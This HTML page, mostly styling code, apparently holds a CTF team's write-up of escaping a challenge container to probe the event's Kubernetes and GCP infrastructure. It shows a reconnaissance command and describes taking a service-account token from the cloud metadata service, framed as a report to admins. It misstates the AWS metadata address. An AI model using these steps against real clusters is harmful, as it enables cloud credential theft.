<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CTF Infrastructure Vulnerability</title>
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link rel="icon" href="../img/logo.svg" type="image/x-icon">
    <style>
[data-color-mode*='light'], [data-color-mode*='light'] body, .markdown-style[theme*='light'] { --color-prettylights-syntax-comment: #6e7781; --color-prettylights-syntax-constant: #0550ae; --color-prettylights-syntax-entity: #8250df; --color-prettylights-syntax-storage-modifier-import: #24292f; --color-prettylights-syntax-entity-tag: #116329; --color-prettylights-syntax-keyword: #cf222e; --color-prettylights-syntax-string: #0a3069; --color-prettylights-syntax-variable: #953800; --color-prettylights-syntax-brackethighlighter-unmatched: #82071e; --color-prettylights-syntax-invalid-illegal-text: #f6f8fa; --color-prettylights-syntax-invalid-illegal-bg: #82071e; --color-prettylights-syntax-carriage-return-text: #f6f8fa; --color-prettylights-syntax-carriage-return-bg: #cf222e; --color-prettylights-syntax-string-regexp: #116329; --color-prettylights-syntax-markup-list: #3b2300; --color-prettylights-syntax-markup-heading: #0550ae; --color-prettylights-syntax-markup-italic: #24292f; --color-prettylights-syntax-markup-bold: #24292f; --color-prettylights-syntax-markup-deleted-text: #82071e; --color-prettylights-syntax-markup-deleted-bg: #FFEBE9; --color-prettylights-syntax-markup-inserted-text: #116329; --color-prettylights-syntax-markup-inserted-bg: #dafbe1; --color-prettylights-syntax-markup-changed-text: #953800; --color-prettylights-syntax-markup-changed-bg: #ffd8b5; --color-prettylights-syntax-markup-ignored-text: #eaeef2; --color-prettylights-syntax-markup-ignored-bg: #0550ae; --color-prettylights-syntax-meta-diff-range: #8250df; --color-prettylights-syntax-brackethighlighter-angle: #57606a; --color-prettylights-syntax-sublimelinter-gutter-mark: #8c959f; --color-prettylights-syntax-constant-other-reference-link: #0a3069; --color-fg-default: #24292f; --color-fg-muted: #57606a; --color-fg-subtle: #6e7781; --color-canvas-default: #ffffff; --color-canvas-subtle: #f6f8fa; --color-border-default: #d0d7de; --color-border-muted: hsla(210,18%,87%,1); --color-neutral-muted: rgba(175,184,193,0.2); --color-accent-fg: #0969da; --color-accent-emphasis: #0969da; --color-attention-subtle: #fff8c5; --color-danger-fg: #cf222e; }
[data-color-mode*='dark'], [data-color-mode*='dark'] body, .markdown-style[theme*='dark'] { --color-prettylights-syntax-comment: #8b949e; --color-prettylights-syntax-constant: #79c0ff; --color-prettylights-syntax-entity: #d2a8ff; --color-prettylights-syntax-storage-modifier-import: #c9d1d9; --color-prettylights-syntax-entity-tag: #7ee787; --color-prettylights-syntax-keyword: #ff7b72; --color-prettylights-syntax-string: #a5d6ff; --color-prettylights-syntax-variable: #ffa657; --color-prettylights-syntax-brackethighlighter-unmatched: #f85149; --color-prettylights-syntax-invalid-illegal-text: #f0f6fc; --color-prettylights-syntax-invalid-illegal-bg: #8e1519; --color-prettylights-syntax-carriage-return-text: #f0f6fc; --color-prettylights-syntax-carriage-return-bg: #b62324; --color-prettylights-syntax-string-regexp: #7ee787; --color-prettylights-syntax-markup-list: #f2cc60; --color-prettylights-syntax-markup-heading: #1f6feb; --color-prettylights-syntax-markup-italic: #c9d1d9; --color-prettylights-syntax-markup-bold: #c9d1d9; --color-prettylights-syntax-markup-deleted-text: #ffdcd7; --color-prettylights-syntax-markup-deleted-bg: #67060c; --color-prettylights-syntax-markup-inserted-text: #aff5b4; --color-prettylights-syntax-markup-inserted-bg: #033a16; --color-prettylights-syntax-markup-changed-text: #ffdfb6; --color-prettylights-syntax-markup-changed-bg: #5a1e02; --color-prettylights-syntax-markup-ignored-text: #c9d1d9; --color-prettylights-syntax-markup-ignored-bg: #1158c7; --color-prettylights-syntax-meta-diff-range: #d2a8ff; --color-prettylights-syntax-brackethighlighter-angle: #8b949e; --color-prettylights-syntax-sublimelinter-gutter-mark: #484f58; --color-prettylights-syntax-constant-other-reference-link: #a5d6ff; --color-fg-default: #c9d1d9; --color-fg-muted: #8b949e; --color-fg-subtle: #484f58; --color-canvas-default: #0d1117; --color-canvas-subtle: #161b22; --color-border-default: #30363d; --color-border-muted: #21262d; --color-neutral-muted: rgba(110,118,129,0.4); --color-accent-fg: #58a6ff; --color-accent-emphasis: #1f6feb; --color-attention-subtle: rgba(187,128,9,0.15); --color-danger-fg: #f85149; }
.markdown-style { display: block; -webkit-text-size-adjust: 100%; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji"; font-size: 16px; line-height: 1.5; word-wrap: break-word; color: var(--color-fg-default); background-color: var(--color-canvas-default); } .markdown-style details, .markdown-style figcaption, .markdown-style figure { display: block; } .markdown-style summary { display: list-item; } .markdown-style [hidden] { display: none !important; } .markdown-style a { background-color: transparent; color: var(--color-accent-fg); text-decoration: none; } .markdown-style a:active, .markdown-style a:hover { outline-width: 0; } .markdown-style abbr[title] { border-bottom: none; text-decoration: underline dotted; } .markdown-style b, .markdown-style strong { font-weight: 600; } .markdown-style dfn { font-style: italic; } .markdown-style h1 { margin: .67em 0; font-weight: 600; padding-bottom: .3em; font-size: 2em; border-bottom: 1px solid var(--color-border-muted); } .markdown-style mark { background-color: var(--color-attention-subtle); color: var(--color-text-primary); } .markdown-style small { font-size: 90%; } .markdown-style sub, .markdown-style sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; } .markdown-style sub { bottom: -0.25em; } .markdown-style sup { top: -0.5em; } .markdown-style img { border-style: none; max-width: 100%; box-sizing: content-box; background-color: var(--color-canvas-default); } .markdown-style code, .markdown-style kbd, .markdown-style pre, .markdown-style samp { font-family: monospace,monospace; font-size: 1em; } .markdown-style figure { margin: 1em 40px; } .markdown-style hr { box-sizing: content-box; overflow: hidden; background: transparent; border-bottom: 1px solid var(--color-border-muted); height: .25em; padding: 0; margin: 24px 0; background-color: var(--color-border-default); border: 0; } .markdown-style input { font: inherit; margin: 0; overflow: visible; font-family: inherit; font-size: inherit; line-height: inherit; } .markdown-style [type=button], .markdown-style [type=reset], .markdown-style [type=submit] { -webkit-appearance: button; } .markdown-style [type=button]::-moz-focus-inner, .markdown-style [type=reset]::-moz-focus-inner, .markdown-style [type=submit]::-moz-focus-inner { border-style: none; padding: 0; } .markdown-style [type=button]:-moz-focusring, .markdown-style [type=reset]:-moz-focusring, .markdown-style [type=submit]:-moz-focusring { outline: 1px dotted ButtonText; } .markdown-style [type=checkbox], .markdown-style [type=radio] { box-sizing: border-box; padding: 0; } .markdown-style [type=number]::-webkit-inner-spin-button, .markdown-style [type=number]::-webkit-outer-spin-button { height: auto; } .markdown-style [type=search] { -webkit-appearance: textfield; outline-offset: -2px; } .markdown-style [type=search]::-webkit-search-cancel-button, .markdown-style [type=search]::-webkit-search-decoration { -webkit-appearance: none; } .markdown-style ::-webkit-input-placeholder { color: inherit; opacity: .54; } .markdown-style ::-webkit-file-upload-button { -webkit-appearance: button; font: inherit; } .markdown-style a:hover { text-decoration: underline; } .markdown-style hr::before { display: table; content: ""; } .markdown-style hr::after { display: table; clear: both; content: ""; } .markdown-style table { border-spacing: 0; border-collapse: collapse; display: block; width: max-content; max-width: 100%; overflow: auto; } .markdown-style td, .markdown-style th { padding: 0; } .markdown-style details summary { cursor: pointer; } .markdown-style details:not([open])>*:not(summary) { display: none !important; } .markdown-style kbd { display: inline-block; padding: 3px 5px; font: 11px ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; line-height: 10px; color: var(--color-fg-default); vertical-align: middle; background-color: var(--color-canvas-subtle); border: solid 1px var(--color-neutral-muted); border-bottom-color: var(--color-neutral-muted); border-radius: 6px; box-shadow: inset 0 -1px 0 var(--color-neutral-muted); } .markdown-style h1, .markdown-style h2, .markdown-style h3, .markdown-style h4, .markdown-style h5, .markdown-style h6 { margin-top: 24px; margin-bottom: 16px; font-weight: 600; line-height: 1.25; } .markdown-style h2 { font-weight: 600; padding-bottom: .3em; font-size: 1.5em; border-bottom: 1px solid var(--color-border-muted); } .markdown-style h3 { font-weight: 600; font-size: 1.25em; } .markdown-style h4 { font-weight: 600; font-size: 1em; } .markdown-style h5 { font-weight: 600; font-size: .875em; } .markdown-style h6 { font-weight: 600; font-size: .85em; color: var(--color-fg-muted); } .markdown-style p { margin-top: 0; margin-bottom: 10px; } .markdown-style blockquote { margin: 0; padding: 0 1em; color: var(--color-fg-muted); border-left: .25em solid var(--color-border-default); } .markdown-style ul, .markdown-style ol { margin-top: 0; margin-bottom: 0; padding-left: 2em; } .markdown-style ol ol, .markdown-style ul ol { list-style-type: lower-roman; } .markdown-style ul ul ol, .markdown-style ul ol ol, .markdown-style ol ul ol, .markdown-style ol ol ol { list-style-type: lower-alpha; } .markdown-style dd { margin-left: 0; } .markdown-style tt, .markdown-style code { font-family: ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; font-size: 12px; } .markdown-style pre { margin-top: 0; margin-bottom: 0; font-family: ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,Liberation Mono,monospace; font-size: 12px; word-wrap: normal; } .markdown-style .octicon { display: inline-block; overflow: visible !important; vertical-align: text-bottom; fill: currentColor; } .markdown-style ::placeholder { color: var(--color-fg-subtle); opacity: 1; } .markdown-style input::-webkit-outer-spin-button, .markdown-style input::-webkit-inner-spin-button { margin: 0; -webkit-appearance: none; appearance: none; }
.markdown-style .token.comment, .markdown-style .token.prolog, .markdown-style .token.doctype, .markdown-style .token.cdata { color: var(--color-prettylights-syntax-comment); } .markdown-style .token.namespace { opacity: 0.7; } .markdown-style .token.tag, .markdown-style .token.selector, .markdown-style .token.constant, .markdown-style .token.symbol, .markdown-style .token.deleted { color: var(--color-prettylights-syntax-entity-tag); } .markdown-style .token.maybe-class-name { color: var(--color-prettylights-syntax-variable); } .markdown-style .token.property-access, .markdown-style .token.operator, .markdown-style .token.boolean, .markdown-style .token.number, .markdown-style .token.selector .markdown-style .token.class, .markdown-style .token.attr-name, .markdown-style .token.string, .markdown-style .token.char, .markdown-style .token.builtin { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.deleted { color: var(--color-prettylights-syntax-markup-deleted-text); } .markdown-style .token.property { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.punctuation { color: var(--color-prettylights-syntax-markup-bold); } .markdown-style .token.function { color: var(--color-prettylights-syntax-entity); } .markdown-style .code-line .token.deleted { background-color: var(--color-prettylights-syntax-markup-deleted-bg); } .markdown-style .token.inserted { color: var(--color-prettylights-syntax-markup-inserted-text); } .markdown-style .code-line .token.inserted { background-color: var(--color-prettylights-syntax-markup-inserted-bg); } .markdown-style .token.variable { color: var(--color-prettylights-syntax-constant); } .markdown-style .token.entity, .markdown-style .token.url, .language-css .markdown-style .token.string, .style .markdown-style .token.string { color: var(--color-prettylights-syntax-string); } .markdown-style .token.color, .markdown-style .token.atrule, .markdown-style .token.attr-value, .markdown-style .token.function, .markdown-style .token.class-name { color: var(--color-prettylights-syntax-string); } .markdown-style .token.rule, .markdown-style .token.regex, .markdown-style .token.important, .markdown-style .token.keyword { color: var(--color-prettylights-syntax-keyword); } .markdown-style .token.coord { color: var(--color-prettylights-syntax-meta-diff-range); } .markdown-style .token.important, .markdown-style .token.bold { font-weight: bold; } .markdown-style .token.italic { font-style: italic; } .markdown-style .token.entity { cursor: help; }
.markdown-style [data-catalyst] { display: block; } .markdown-style g-emoji { font-family: "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 1em; font-style: normal !important; font-weight: 400; line-height: 1; vertical-align: -0.075em; } .markdown-style g-emoji img { width: 1em; height: 1em; } .markdown-style::before { display: table; content: ""; } .markdown-style::after { display: table; clear: both; content: ""; } .markdown-style>*:first-child { margin-top: 0 !important; } .markdown-style>*:last-child { margin-bottom: 0 !important; } .markdown-style a:not([href]) { color: inherit; text-decoration: none; } .markdown-style .absent { color: var(--color-danger-fg); } .markdown-style a.anchor { float: left; padding-right: 4px; margin-left: -20px; line-height: 1; } .markdown-style a.anchor:focus { outline: none; } .markdown-style p, .markdown-style blockquote, .markdown-style ul, .markdown-style ol, .markdown-style dl, .markdown-style table, .markdown-style pre, .markdown-style details { margin-top: 0; margin-bottom: 16px; } .markdown-style blockquote>:first-child { margin-top: 0; } .markdown-style blockquote>:last-child { margin-bottom: 0; } .markdown-style sup>a::before { content: "["; } .markdown-style sup>a::after { content: "]"; }
.markdown-style .octicon-video { border: 1px solid #d0d7de !important; border-radius: 6px !important; display: block; } .markdown-style .octicon-video summary { border-bottom: 1px solid #d0d7de !important; padding: 8px 16px !important; cursor: pointer; } .markdown-style .octicon-video > video { display: block !important; max-width: 100% !important; padding: 2px; box-sizing: border-box; border-bottom-right-radius: 6px !important; border-bottom-left-radius: 6px !important; } .markdown-style details.octicon-video:not([open])>*:not(summary) { display: none !important; } .markdown-style details.octicon-video:not([open]) > summary { border-bottom: 0 !important; } .markdown-style h1 .octicon-link, .markdown-style h2 .octicon-link, .markdown-style h3 .octicon-link, .markdown-style h4 .octicon-link, .markdown-style h5 .octicon-link, .markdown-style h6 .octicon-link { color: var(--color-fg-default); vertical-align: middle; visibility: hidden; } .markdown-style h1:hover .anchor, .markdown-style h2:hover .anchor, .markdown-style h3:hover .anchor, .markdown-style h4:hover .anchor, .markdown-style h5:hover .anchor, .markdown-style h6:hover .anchor { text-decoration: none; } .markdown-style h1:hover .anchor .octicon-link, .markdown-style h2:hover .anchor .octicon-link, .markdown-style h3:hover .anchor .octicon-link, .markdown-style h4:hover .anchor .octicon-link, .markdown-style h5:hover .anchor .octicon-link, .markdown-style h6:hover .anchor .octicon-link { visibility: visible; } .markdown-style h1 tt, .markdown-style h1 code, .markdown-style h2 tt, .markdown-style h2 code, .markdown-style h3 tt, .markdown-style h3 code, .markdown-style h4 tt, .markdown-style h4 code, .markdown-style h5 tt, .markdown-style h5 code, .markdown-style h6 tt, .markdown-style h6 code { padding: 0 .2em; font-size: inherit; } .markdown-style ul.no-list, .markdown-style ol.no-list { padding: 0; list-style-type: none; } .markdown-style ol[type="1"] { list-style-type: decimal; } .markdown-style ol[type=a] { list-style-type: lower-alpha; } .markdown-style ol[type=i] { list-style-type: lower-roman; } .markdown-style div>ol:not([type]) { list-style-type: decimal; } .markdown-style ul ul, .markdown-style ul ol, .markdown-style ol ol, .markdown-style ol ul { margin-top: 0; margin-bottom: 0; } .markdown-style li>p { margin-top: 16px; } .markdown-style li+li { margin-top: .25em; } .markdown-style dl { padding: 0; } .markdown-style dl dt { padding: 0; margin-top: 16px; font-size: 1em; font-style: italic; font-weight: 600; } .markdown-style dl dd { padding: 0 16px; margin-bottom: 16px; } .markdown-style table th { font-weight: 600; } .markdown-style table th, .markdown-style table td { padding: 6px 13px; border: 1px solid var(--color-border-default); } .markdown-style table tr { background-color: var(--color-canvas-default); border-top: 1px solid var(--color-border-muted); } .markdown-style table tr:nth-child(2n) { background-color: var(--color-canvas-subtle); } .markdown-style table img { background-color: transparent; vertical-align: middle; } .markdown-style img[align=right] { padding-left: 20px; } .markdown-style img[align=left] { padding-right: 20px; } .markdown-style .emoji { max-width: none; vertical-align: text-top; background-color: transparent; } .markdown-style span.frame { display: block; overflow: hidden; } .markdown-style span.frame>span { display: block; float: left; width: auto; padding: 7px; margin: 13px 0 0; overflow: hidden; border: 1px solid var(--color-border-default); } .markdown-style span.frame span img { display: block; float: left; } .markdown-style span.frame span span { display: block; padding: 5px 0 0; clear: both; color: var(--color-fg-default); } .markdown-style span.align-center { display: block; overflow: hidden; clear: both; } .markdown-style span.align-center>span { display: block; margin: 13px auto 0; overflow: hidden; text-align: center; } .markdown-style span.align-center span img { margin: 0 auto; text-align: center; } .markdown-style span.align-right { display: block; overflow: hidden; clear: both; } .markdown-style span.align-right>span { display: block; margin: 13px 0 0; overflow: hidden; text-align: right; } .markdown-style span.align-right span img { margin: 0; text-align: right; } .markdown-style span.float-left { display: block; float: left; margin-right: 13px; overflow: hidden; } .markdown-style span.float-left span { margin: 13px 0 0; } .markdown-style span.float-right { display: block; float: right; margin-left: 13px; overflow: hidden; } .markdown-style span.float-right>span { display: block; margin: 13px auto 0; overflow: hidden; text-align: right; } .markdown-style code, .markdown-style tt { padding: .2em .4em; margin: 0; font-size: 85%; background-color: var(--color-neutral-muted); border-radius: 6px; } .markdown-style code br, .markdown-style tt br { display: none; } .markdown-style del code { text-decoration: inherit; } .markdown-style pre code { font-size: 100%; } .markdown-style pre>code { padding: 0; margin: 0; word-break: normal; white-space: pre; background: transparent; border: 0; } .markdown-style pre { position: relative; font-size: 85%; line-height: 1.45; background-color: var(--color-canvas-subtle); border-radius: 6px; } .markdown-style pre code, .markdown-style pre tt { display: inline; max-width: auto; padding: 0; margin: 0; overflow: visible; line-height: inherit; word-wrap: normal; background-color: transparent; border: 0; } .markdown-style pre > code { padding: 16px; overflow: auto; display: block; } .markdown-style .csv-data td, .markdown-style .csv-data th { padding: 5px; overflow: hidden; font-size: 12px; line-height: 1; text-align: left; white-space: nowrap; } .markdown-style .csv-data .blob-num { padding: 10px 8px 9px; text-align: right; background: var(--color-canvas-default); border: 0; } .markdown-style .csv-data tr { border-top: 0; } .markdown-style .csv-data th { font-weight: 600; background: var(--color-canvas-subtle); border-top: 0; } .markdown-style .footnotes { font-size: 12px; color: var(--color-fg-muted); border-top: 1px solid var(--color-border-default); } .markdown-style .footnotes ol { padding-left: 16px; } .markdown-style .footnotes li { position: relative; } .markdown-style .footnotes li:target::before { position: absolute; top: -8px; right: -8px; bottom: -8px; left: -24px; pointer-events: none; content: ""; border: 2px solid var(--color-accent-emphasis); border-radius: 6px; } .markdown-style .footnotes li:target { color: var(--color-fg-default); } .markdown-style .footnotes .data-footnote-backref g-emoji { font-family: monospace; } .markdown-style .task-list-item { list-style-type: none; } .markdown-style .task-list-item label { font-weight: 400; } .markdown-style .task-list-item.enabled label { cursor: pointer; } .markdown-style .task-list-item+.task-list-item { margin-top: 3px; } .markdown-style .task-list-item .handle { display: none; } .markdown-style .task-list-item-checkbox, .markdown-style input[type="checkbox"] { margin: 0 .2em .25em -1.6em; vertical-align: middle; } .markdown-style .contains-task-list:dir(rtl) .task-list-item-checkbox, .markdown-style .contains-task-list:dir(rtl) input[type="checkbox"] { margin: 0 -1.6em .25em .2em; } .markdown-style ::-webkit-calendar-picker-indicator { filter: invert(50%); }

/** copy button style **/
.markdown-style pre .copied {
  display: flex;
  position: absolute;
  cursor: pointer;
  color: #a5afbb;
  top: 6px;
  right: 6px;
  border-radius: 5px;
  background: #82828226;
  padding: 6px;
  font-size: 12px;
  transition: all .3s;
}
.markdown-style pre .copied:not(.active) { visibility: hidden; }
.markdown-style pre:hover .copied { visibility: visible; }
.markdown-style pre:hover .copied:hover { background: #4caf50; color: #fff; }
.markdown-style pre:hover .copied:active,
.markdown-style pre .copied.active { background: #2e9b33; color: #fff; }
.markdown-style pre .copied svg { position: relative; }
.markdown-style pre .copied .octicon-copy { display: block; }
.markdown-style pre .copied .octicon-check { display: none; }
.markdown-style pre .active .octicon-copy { display: none; }
.markdown-style pre .active .octicon-check { display: block; }

/** octicon style **/
.markdown-style h1:hover a.anchor .octicon-link:before,
.markdown-style h2:hover a.anchor .octicon-link:before,
.markdown-style h3:hover a.anchor .octicon-link:before,
.markdown-style h4:hover a.anchor .octicon-link:before,
.markdown-style h5:hover a.anchor .octicon-link:before,
.markdown-style h6:hover a.anchor .octicon-link:before {
  width: 16px;
  height: 16px;
  content: ' ';
  display: inline-block;
  background-color: currentColor;
  -webkit-mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' version='1.1' aria-hidden='true'><path fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z'></path></svg>");
  mask-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16' version='1.1' aria-hidden='true'><path fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z'></path></svg>");
}

.markdown-style ::-webkit-scrollbar {
  background: transparent;
  width: 8px;
  height: 8px;
}

.markdown-style ::-webkit-scrollbar-thumb {
  background: var(--color-fg-muted);
  border-radius: 10px;
}
</style>
  </head>
  <body><dark-mode style="position: fixed; top: 8px; left: 10px; z-index: 999;" dark="Dark" light="Light" permanent="true"></dark-mode><script>const t=document;const e="_dark_mode_theme_";const s="permanent";const o="colorschemechange";const i="permanentcolorscheme";const h="light";const r="dark";const n=(t,e,s=e)=>{Object.defineProperty(t,s,{enumerable:true,get(){const t=this.getAttribute(e);return t===null?"":t},set(t){this.setAttribute(e,t)}})};const c=(t,e,s=e)=>{Object.defineProperty(t,s,{enumerable:true,get(){return this.hasAttribute(e)},set(t){if(t){this.setAttribute(e,"")}else{this.removeAttribute(e)}}})};class a extends HTMLElement{static get observedAttributes(){return["mode",h,r,s]}LOCAL_NANE=e;constructor(){super();this.t()}connectedCallback(){n(this,"mode");n(this,r);n(this,h);c(this,s);const a=localStorage.getItem(e);if(a&&[h,r].includes(a)){this.mode=a;this.permanent=true}if(this.permanent&&!a){localStorage.setItem(e,this.mode)}const l=[h,r].includes(a);if(this.permanent&&a){this.o()}else{if(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches){this.mode=r;this.o()}if(window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches){this.mode=h;this.o()}}if(!this.permanent&&!l){window.matchMedia("(prefers-color-scheme: light)").onchange=t=>{this.mode=t.matches?h:r;this.o()};window.matchMedia("(prefers-color-scheme: dark)").onchange=t=>{this.mode=t.matches?r:h;this.o()}}const d=new MutationObserver(((s,h)=>{this.mode=t.documentElement.dataset.colorMode;if(this.permanent&&l){localStorage.setItem(e,this.mode);this.i(i,{permanent:this.permanent})}this.h();this.i(o,{colorScheme:this.mode})}));d.observe(t.documentElement,{attributes:true});this.i(o,{colorScheme:this.mode});this.h()}attributeChangedCallback(t,s,o){if(t==="mode"&&s!==o&&[h,r].includes(o)){const t=localStorage.getItem(e);if(this.mode===t){this.mode=o;this.h();this.o()}else if(this.mode&&this.mode!==t){this.h();this.o()}}else if((t===h||t===r)&&s!==o){this.h()}if(t==="permanent"&&typeof this.permanent==="boolean"){this.permanent?localStorage.setItem(e,this.mode):localStorage.removeItem(e)}}o(){t.documentElement.setAttribute("data-color-mode",this.mode)}h(){this.icon.textContent=this.mode===h?"🌒":"🌞";this.text.textContent=this.mode===h?this.getAttribute(r):this.getAttribute(h);if(!this.text.textContent&&this.text.parentElement&&this.text){this.text.parentElement.removeChild(this.text)}}t(){var s=this.attachShadow({mode:"open"});this.label=t.createElement("span");this.label.setAttribute("class","wrapper");this.label.onclick=()=>{this.mode=this.mode===h?r:h;if(this.permanent){localStorage.setItem(e,this.mode)}this.o();this.h()};s.appendChild(this.label);this.icon=t.createElement("span");this.icon.part="icon";this.label.appendChild(this.icon);this.text=t.createElement("span");this.text.part="text";this.label.appendChild(this.text);const o=`
[data-color-mode*='dark'], [data-color-mode*='dark'] body {
  color-scheme: dark;
  --color-theme-bg: #0d1117;
  --color-theme-text: #c9d1d9;
  background-color: var(--color-theme-bg);
  color: var(--color-theme-text);
}

[data-color-mode*='light'], [data-color-mode*='light'] body {
  color-scheme: light;
  --color-theme-bg: #fff;
  --color-theme-text: #24292f;
  background-color: var(--color-theme-bg);
  color: var(--color-theme-text);
}`;const i="_dark_mode_style_";const n=t.getElementById(i);if(!n){var c=t.createElement("style");c.id=i;c.textContent=o;t.head.appendChild(c)}var a=t.createElement("style");a.textContent=`
    .wrapper { cursor: pointer; user-select: none; position: relative; }
    .wrapper > span + span { margin-left: .4rem; }
    `;s.appendChild(a)}i(t,e){this.dispatchEvent(new CustomEvent(t,{bubbles:true,composed:true,detail:e}))}}customElements.define("dark-mode",a);</script><div style="max-width: 960px; margin: 0 auto 60px auto; padding: 8px;max-width: 960px;" class="markdown-style">
    <h1 id="first-attempt-at-pwning-kubernetes"><a class="anchor" aria-hidden="true" tabindex="-1" href="#first-attempt-at-pwning-kubernetes"><span class="octicon octicon-link"></span></a>First attempt at pwning Kubernetes</h1>
    <p>After our dear pwner friend popped a shell in ftp-console he dumped env to check if the flag was there, no flag to be found, but there were instead some interesting environment variables:</p>
    <pre class="language-shell"><code class="language-shell code-highlight"><span class="code-line line-number" line="1"><span class="token assign-left variable">KUBERNETES_SERVICE_PORT</span><span class="token operator">=</span><span class="token number">443</span>
</span><span class="code-line line-number" line="2"><span class="token assign-left variable">KUBERNETES_PORT</span><span class="token operator">=</span>tcp://10.59.240.1:443
</span></code><div onclick="copied(this)" data-code="KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.59.240.1:443
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Could that mean that we also got a Kubernetes service account mounted into the challenge container?</p>
    <pre class="language-shell"><code class="language-shell code-highlight"><span class="code-line line-number" line="1">$ <span class="token function">mount</span> <span class="token operator">|</span> <span class="token function">grep</span> kube
</span><span class="code-line line-number" line="2">tmpfs on /run/secrets/kubernetes.io/serviceaccount <span class="token builtin class-name">type</span> tmpfs <span class="token punctuation">(</span>ro,relatime,size<span class="token operator">=</span>6175196k<span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="$ mount | grep kube
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=6175196k)
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Unfortunately it looks like the service account is unprivileged so it can't do anything useful, time to dig more...</p>
    <h1 id="google-cloud-instance-metadata-service"><a class="anchor" aria-hidden="true" tabindex="-1" href="#google-cloud-instance-metadata-service"><span class="octicon octicon-link"></span></a>Google Cloud instance metadata service</h1>
    <p>
      After some searching online we found out that GCP has something similar to AWS's 169.169.254.254 that's reachable via <code>http://metadata.google.internal/</code>. That required some way to do HTTP requests from our shell but nothing useful was installed (no cURL, wget, Python, Perl etc), no big issue because we managed to upload a static cURL build as a crazy big base64 blob.
      In the end we managed to snag a token for the service account linked to the instance, sadly that didn't have any interesting privileges so we figured out we should go back to intended challenges and stop mucking around with CTF infra.
    </p>
    <h1 id="initial-report-to-admins"><a class="anchor" aria-hidden="true" tabindex="-1" href="#initial-report-to-admins"><span class="octicon octicon-link"></span></a>Initial report to admins</h1>
    <p>
